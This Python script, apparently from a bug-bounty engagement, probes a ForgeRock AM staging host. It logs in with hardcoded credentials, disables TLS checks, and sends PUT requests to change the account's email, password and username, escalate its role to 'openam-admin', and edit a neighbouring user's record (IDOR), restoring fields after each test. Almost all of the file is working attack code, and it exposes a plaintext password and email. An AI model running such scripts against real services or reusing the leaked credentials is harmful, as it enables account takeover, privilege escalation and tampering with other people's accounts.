# -*- coding: utf-8 -*-
"""AIC 第二十六轮:PUT users/{id} 自更新接口——敏感字段修改验证(核心)
发现:PUT users/{id} 200 可改 givenName
验证矩阵(每项测试后立即恢复):
  1. mail 修改(→账号接管前提)
  2. userpassword 修改(→直接接管)
  3. roles 修改(→提权)
  4. userName 修改(→身份混淆)
  5. 修改他人(IDOR)
"""
import requests, urllib3, json, time
urllib3.disable_warnings()

BASE = 'https://openam-bug-bounty-stag.forgeblocks.com'
AUTH = BASE + '/am/json/realms/alpha/authenticate'
USER, PASS = 'pccp', 'Agent360User$5h2!QxR'
MY_ID = 'db3d6356-61a0-4684-9eaa-c1353dfa44d9'
ORIG_MAIL = '1643584176@qq.com'

S = requests.Session()
S.trust_env = False
S.proxies = {'http': None, 'https': None}
S.headers.update({'User-Agent': 'Mozilla/5.0', 'Accept-API-Version': 'resource=1.0, protocol=1.0',
                  'Content-Type': 'application/json'})
r = S.post(AUTH, json={}, timeout=15, verify=False)
d = r.json()
authId = d['authId']
cbs = []
for cb in d.get('callbacks', []):
    t = cb['type']
    inp = [{'name': 'IDToken1', 'value': USER}] if t == 'NameCallback' else \
          [{'name': 'IDToken2', 'value': PASS}] if t == 'PasswordCallback' else \
          [{'name': k.get('name'), 'value': k.get('value')} for k in cb.get('input', [])]
    cbs.append({'type': t, 'output': cb.get('output', []), 'input': inp, '_id': cb.get('_id')})
S.post(AUTH, json={'authId': authId, 'callbacks': cbs}, timeout=15, verify=False)
tok = S.cookies.get('aa942d46ece12ce')
print('LOGIN OK')

S2 = requests.Session()
S2.trust_env = False
S2.proxies = {'http': None, 'https': None}
S2.headers.update({'User-Agent': 'research-1643', 'Cookie': 'aa942d46ece12ce=' + tok,
                   'Content-Type': 'application/json', 'Accept-API-Version': 'resource=2.1, protocol=1.0'})

U = '/am/json/realms/root/realms/alpha/users/' + MY_ID

def put_user(body, label=''):
    try:
        r = S2.put(BASE + U, json=body, timeout=12, verify=False)
        print('PUT %-12s -> %d  %s' % (label, r.status_code, r.text[:260].replace('\n', ' ')))
        return r
    except Exception as e:
        print('PUT %-12s -> ERR %s' % (label, str(e)[:60]))

def get_user():
    r = S2.get(BASE + U, timeout=12, verify=False)
    return r.json() if r.status_code == 200 else {}

def login_as(u, p):
    S3 = requests.Session()
    S3.trust_env = False
    S3.proxies = {'http': None, 'https': None}
    S3.headers.update({'User-Agent': 'x', 'Accept-API-Version': 'resource=1.0, protocol=1.0',
                       'Content-Type': 'application/json'})
    try:
        r = S3.post(AUTH, json={}, timeout=12, verify=False)
        d = r.json()
        cbs = []
        for cb in d.get('callbacks', []):
            t = cb['type']
            inp = [{'name': 'IDToken1', 'value': u}] if t == 'NameCallback' else \
                  [{'name': 'IDToken2', 'value': p}] if t == 'PasswordCallback' else \
                  [{'name': k.get('name'), 'value': k.get('value')} for k in cb.get('input', [])]
            cbs.append({'type': t, 'output': cb.get('output', []), 'input': inp, '_id': cb.get('_id')})
        r2 = S3.post(AUTH, json={'authId': d['authId'], 'callbacks': cbs}, timeout=12, verify=False)
        return r2.status_code, bool(r2.json().get('tokenId'))
    except Exception:
        return 0, False

print('=== 基线:当前用户 ===')
print(json.dumps(get_user(), ensure_ascii=False)[:300])

print('\n=== 1. mail 修改 ===')
put_user({'mail': ['test1643@test.com']}, 'mail=test1643')
cur = get_user()
print('  当前 mail:', cur.get('mail'), ' | userName:', cur.get('username'))
if cur.get('mail') == ['test1643@test.com']:
    print('  [发现] mail 修改生效!改回...')
    put_user({'mail': [ORIG_MAIL]}, '恢复 mail')
    print('  恢复后 mail:', get_user().get('mail'))

print('\n=== 2. userpassword 修改 ===')
put_user({'userpassword': 'NewPass1643$!'}, 'userpassword')
ok_new = login_as(USER, 'NewPass1643$!')
ok_old = login_as(USER, PASS)
print('  新密码登录:', ok_new, '| 原密码登录:', ok_old)
if ok_new[1] and not ok_old[1]:
    print('  [发现] userpassword 修改生效(可直接改密)!恢复...')
    put_user({'userpassword': PASS}, '恢复密码')
    print('  恢复后原密码登录:', login_as(USER, PASS))
elif ok_old[1] and not ok_new[1]:
    print('  userpassword 未生效(可能被忽略或需当前密码)')

print('\n=== 3. roles 修改(提权) ===')
put_user({'roles': ['openam-admin']}, 'roles=admin')
cur = get_user()
print('  当前 roles:', cur.get('roles'))
if cur.get('roles') == ['openam-admin']:
    print('  [发现] roles 修改生效(提权)!恢复...')
    put_user({'roles': ['ui-self-service-user']}, '恢复 roles')
    print('  恢复后 roles:', get_user().get('roles'))

print('\n=== 4. userName 修改 ===')
put_user({'userName': 'pccp_temp1643'}, 'userName=temp')
cur = get_user()
print('  当前 username:', cur.get('username'))
if cur.get('username') == 'pccp_temp1643':
    print('  [发现] userName 修改生效!恢复...')
    put_user({'userName': 'pccp'}, '恢复 userName')
    print('  恢复后 username:', get_user().get('username'))

print('\n=== 5. 修改他人(IDOR) ===')
OTHER = 'db3d6356-61a0-4684-9eaa-c1353dfa44d8'  # 邻近 UUID
r = S2.put(BASE + '/am/json/realms/root/realms/alpha/users/' + OTHER,
           {'givenName': ['idortest']}, timeout=12, verify=False)
print('PUT 他人:', r.status_code, r.text[:200].replace('\n', ' '))
# researcher1643(注册的挂起账号,如果知道其 UUID)
# 用 userName 查询确认 researcher1643 的 UUID(如果查不到跳过)
r = S2.get(BASE + '/am/json/realms/root/realms/alpha/users?_queryFilter=userName+eq+%22researcher1643%22',
           timeout=12, verify=False)
print('查 researcher1643:', r.status_code, r.text[:150].replace('\n', ' '))

print('\n=== 6. 最终状态确认 ===')
cur = get_user()
print('最终用户资料:', json.dumps(cur, ensure_ascii=False)[:400])
print('原密码登录:', login_as(USER, PASS))
